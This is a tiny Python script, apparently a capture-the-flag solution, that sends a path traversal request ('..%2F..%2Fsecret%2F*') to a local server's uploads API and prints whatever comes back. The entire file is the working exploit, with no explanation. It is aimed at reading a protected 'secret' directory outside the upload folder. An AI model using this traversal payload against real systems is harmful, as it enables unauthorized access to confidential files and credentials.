import requests
import re
import string

r = requests.get("http://127.0.0.1:25027/api/uploads/..%2F..%2Fsecret%2F*?mode=query")

print(r.text)
    